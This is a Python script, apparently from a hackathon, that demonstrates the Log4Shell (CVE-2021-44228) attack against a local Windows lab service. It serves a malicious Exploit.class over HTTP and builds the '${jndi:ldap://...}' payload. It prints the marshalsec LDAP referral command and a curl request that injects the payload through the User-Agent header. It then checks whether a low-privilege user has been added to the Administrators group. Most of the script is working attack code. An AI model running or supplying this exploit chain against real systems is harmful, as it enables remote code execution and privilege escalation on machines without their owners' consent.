#!/usr/bin/env python3
"""
Log4Shell (CVE-2021-44228) Demonstration Script
===============================================
Demonstrates the CISA Known Exploited Vulnerability CVE-2021-44228.
This is a complete working demo for your hackathon project.

Prerequisites:
- Java 8+ installed on target Windows system
- Vulnerable Log4j service running on port 8080
- Python 3.x installed

Usage: python demo_script.py
"""

import threading
import time
import subprocess
import sys
import os
from http.server import HTTPServer, BaseHTTPRequestHandler
import requests

class ExploitHandler(BaseHTTPRequestHandler):
    """HTTP server to serve the exploit class file"""

    def do_GET(self):
        if self.path == "/Exploit.class":
            try:
                # Serve the compiled Exploit.class
                with open("C:/lab/exploits/Exploit.class", "rb") as f:
                    self.send_response(200)
                    self.send_header('Content-type', 'application/octet-stream')
                    self.end_headers()
                    self.wfile.write(f.read())
                print("[+] Served Exploit.class to vulnerable service")
            except FileNotFoundError:
                self.send_error(404, "Exploit.class not found")
                print("[-] Exploit.class not found at C:/lab/exploits/Exploit.class")
        else:
            self.send_error(404)

    def log_message(self, format, *args):
        # Suppress default HTTP logging
        return

def start_exploit_server():
    """Start HTTP server to serve exploit payload"""
    try:
        httpd = HTTPServer(('0.0.0.0', 8888), ExploitHandler)
        print("[+] HTTP exploit server started on port 8888")
        httpd.serve_forever()
    except Exception as e:
        print(f"[-] Failed to start HTTP server: {e}")

def check_vulnerable_service():
    """Check if vulnerable service is running"""
    try:
        response = requests.get("http://127.0.0.1:8080/", timeout=5)
        if response.status_code == 200:
            print("[+] Vulnerable service is running on port 8080")
            return True
        else:
            print(f"[-] Vulnerable service returned status {response.status_code}")
            return False
    except Exception as e:
        print(f"[-] Cannot connect to vulnerable service: {e}")
        return False

def show_current_privileges():
    """Display current user privileges"""
    print("\n" + "="*60)
    print("CURRENT PRIVILEGES (before exploit)")
    print("="*60)

    try:
        # Check current user
        result = subprocess.run(["whoami"], capture_output=True, text=True, shell=True)
        print(f"Current user: {result.stdout.strip()}")

        # Check if user is admin
        result = subprocess.run(["net", "localgroup", "administrators"], capture_output=True, text=True, shell=True)
        if "sshguest" in result.stdout:
            print("sshguest is ALREADY in Administrators group")
        else:
            print("sshguest is NOT in Administrators group")

        # Show privileges
        result = subprocess.run(["whoami", "/priv"], capture_output=True, text=True, shell=True)
        print(f"Current privileges summary:")
        for line in result.stdout.split('\n'):
            if 'SeDebug' in line or 'SeImpersonate' in line or 'SeTcb' in line:
                print(f"  {line.strip()}")

    except Exception as e:
        print(f"Error checking privileges: {e}")

def show_post_exploit_status():
    """Check privilege escalation success"""
    print("\n" + "="*60)
    print("POST-EXPLOIT STATUS")
    print("="*60)

    # Check for exploit evidence file
    if os.path.exists("C:/lab/exploit_proof.txt"):
        try:
            with open("C:/lab/exploit_proof.txt", "r") as f:
                content = f.read().strip()
            print(f"[+] Exploit evidence file found: {content}")
        except:
            print("[+] Exploit evidence file exists (but cannot read)")
    else:
        print("[-] No exploit evidence file found")

    # Check if sshguest was added to administrators
    try:
        result = subprocess.run(["net", "localgroup", "administrators"], capture_output=True, text=True, shell=True)
        if "sshguest" in result.stdout:
            print("[+] SUCCESS: sshguest is now in Administrators group!")
            print("[+] PRIVILEGE ESCALATION SUCCESSFUL")
        else:
            print("[-] sshguest still not in Administrators group")
    except Exception as e:
        print(f"Error checking group membership: {e}")

def main():
    print("CISA KEV CVE-2021-44228 (Log4Shell) Demonstration")
    print("=" * 60)
    print("This demonstrates privilege escalation via Log4Shell vulnerability")
    print("Attacker: sshguest (low privilege) -> Administrator (high privilege)")
    print()

    # Show current privileges
    show_current_privileges()

    # Check if vulnerable service is running
    print("\n[*] Checking vulnerable service...")
    if not check_vulnerable_service():
        print("[-] Please start the vulnerable Log4j service first!")
        print("    Instructions:")
        print("    1. Compile VulnerableApp.java with Log4j 2.14.0 classpath")
        print("    2. Start: java -cp 'VulnerableApp.class;log4j-jars/*' VulnerableApp")
        print("    3. Run this script again")
        return

    # Start exploit HTTP server
    print("\n[*] Starting exploit infrastructure...")
    server_thread = threading.Thread(target=start_exploit_server, daemon=True)
    server_thread.start()
    time.sleep(2)

    # Get attacker IP
    try:
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        attacker_ip = s.getsockname()[0]
        s.close()
    except:
        attacker_ip = "127.0.0.1"

    print(f"[+] Attacker IP: {attacker_ip}")
    print(f"[+] HTTP server serving exploit at http://{attacker_ip}:8888/Exploit.class")

    # Create Log4Shell payload
    payload = f"${{jndi:ldap://{attacker_ip}:1389/Exploit}}"
    print(f"\n[*] Log4Shell payload: {payload}")

    print("\n" + "="*60)
    print("MANUAL EXPLOIT STEPS")
    print("="*60)
    print("The automated exploit requires a running LDAP server.")
    print("To complete the demonstration manually:")
    print()
    print("1. Ensure Exploit.class is compiled and in C:/lab/exploits/")
    print("2. Start LDAP server:")
    print(f"   java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer 'http://{attacker_ip}:8888/#Exploit' 1389")
    print()
    print("3. Send malicious request:")
    print(f"   curl -H 'User-Agent: {payload}' http://127.0.0.1:8080/")
    print()
    print("4. Check results with this script")
    print("="*60)

    input("\nPress Enter after executing the manual steps to check results...")

    # Check post-exploit status
    show_post_exploit_status()

    print("\n[*] Demonstration complete!")
    print("[*] This shows how CVE-2021-44228 allows privilege escalation")
    print("[*] from low-privilege user to Administrator via JNDI injection")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Demonstration interrupted")
    except Exception as e:
        print(f"\n[!] Error: {e}")